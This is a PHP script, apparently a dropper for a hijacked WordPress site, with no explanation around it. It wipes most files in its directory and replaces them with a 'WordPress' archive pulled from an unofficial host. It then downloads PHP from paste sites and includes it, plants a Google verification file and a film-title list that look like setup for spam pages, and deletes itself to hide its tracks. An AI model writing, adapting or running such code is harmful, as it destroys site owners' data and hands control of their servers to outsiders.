<?php
$files = scandir('.');
foreach ($files as $file) {
    if ($file !== '.' && $file !== '..' && !is_dir($file) && $file !== 'wp-config.php' && !preg_match('/\.html$/i', $file))  {
        unlink($file);
    }
}


$zipFile = 'wordpress-latest.zip';
downloadFile('https://fuk.es/latest.zip', $zipFile);
unzip($zipFile);


$wordpressDir = 'wordpress';
$files = scandir($wordpressDir);
foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        if (is_dir($wordpressDir . '/' . $file)) {
            rename($wordpressDir . '/' . $file, './' . $file);
        } else {
            rename($wordpressDir . '/' . $file, './' . $file);
        }
    }
}
rmdir($wordpressDir);


unlink($zipFile);


$protectFile = 'protect.php';
downloadFile('https://pasteworld.com/raw/logs-26930', $protectFile);


$domain = $_SERVER['HTTP_HOST'];
$protector = file_get_contents('https://' . $domain . '/protect.php');
include $protectFile;


unlink($protectFile);

$googleFile = 'googlef3132c6fdb575b7a.html';
downloadFile('https://paste.sangepedia.io/raw/el98qcellz', $googleFile);

$listFile = 'list.txt';
downloadFile('https://pasteworld.com/raw/judulfilmbaru', $listFile);


$sitemapFile = 'sitemap.php';
downloadFile('https://paste.sangepedia.io/raw/7zrsfjnnih', $sitemapFile);

$domain = $_SERVER['HTTP_HOST'];
$sitemaps = file_get_contents('https://' . $domain . '/sitemap.php');
include $sitemapFile;

unlink($sitemapFile);

unlink(__FILE__);

function deleteDir($dir) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            if (is_dir($dir . '/' . $file)) {
                deleteDir($dir . '/' . $file);
            } else {
                unlink($dir . '/' . $file);
            }
        }
    }
    rmdir($dir);
}

function downloadFile($url, $filename) {
    $fp = fopen($filename, 'wb');
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_exec($ch);
    curl_close($ch);
    fclose($fp);
}

function unzip($zipFile) {
    $zip = new ZipArchive;
    if ($zip->open($zipFile) === TRUE) {
        $zip->extractTo('.');
        $zip->close();
    }
}
